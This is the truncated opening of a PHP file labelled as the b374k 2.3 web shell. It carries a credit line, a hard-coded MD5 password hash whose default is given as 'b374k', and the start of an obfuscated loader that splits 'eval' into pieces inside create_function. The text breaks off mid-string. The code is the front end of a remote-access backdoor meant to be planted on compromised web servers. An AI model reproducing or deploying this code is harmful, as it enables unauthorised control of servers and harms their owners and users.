<?php
/*
	b374k 2.3
	Jayalah Indonesiaku
	(c) 2013
	http://code.google.com/p/b374k-shell

*/

// shell password, fill with password in md5 format to protect shell, default : b374k
$s_pass = "0de664ecd2be02cdd54234a0d1229b43";
$b374k=@create_function('$x,$y','ev'.'al'.'("\$s_pass=\"$y\";?>